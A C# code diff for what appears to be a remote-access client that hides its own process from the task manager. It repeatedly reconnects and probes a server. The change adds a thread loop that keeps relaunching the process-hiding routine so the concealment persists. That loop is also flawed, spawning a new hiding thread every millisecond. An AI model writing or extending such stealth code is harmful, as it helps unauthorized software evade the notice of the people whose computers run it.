@@ -11,7 +11,8 @@ namespace Client
     {
         private static  LocalMachine _ThisPC = new LocalMachine();
         private static  Server       _Server = new Server();
-        
+        private static Thread _ThreadHandler;
+
         // Contents of this function should only be run once at the beginning.
         private static void Init()
         {
@@ -24,14 +25,14 @@ namespace Client
             CheckMachineStates();
 
             // Hide this process from the task manager.
-            Thread processScanThread = new Thread(ThreadedAPI.TProcs.HideProccess);
-            processScanThread.Start(Process.GetCurrentProcess().ProcessName);
+            _ThreadHandler = new Thread(ManageThreads);
+            _ThreadHandler.Start();
+          
         }
 
         static void Main(string[] args)
         {
             Init();
-
             do
             {
                 // If we are offline.
@@ -52,6 +53,7 @@ namespace Client
                     //Start();
                 }
 
+                
                 Thread.Sleep(1000);
             } while (true);
         }
@@ -62,6 +64,25 @@ namespace Client
             _ThisPC.Reconnect();
             _Server.Probe();
         }
+
+        private static void ManageThreads()
+        {
+            Thread processScanThread;   
+            while (ThreadedAPI.IsRunning)
+            {
+                processScanThread = new Thread(ThreadedAPI.TProcs.HideProccess);
+
+                if (!processScanThread.IsAlive)
+                {
+                    Console.WriteLine("Thread died, rebooting her up!");
+
+                    processScanThread.Start(Process.GetCurrentProcess().ProcessName);
+                }
+
+                Thread.Sleep(1);
+            }
+        }
+
 
     }
 }
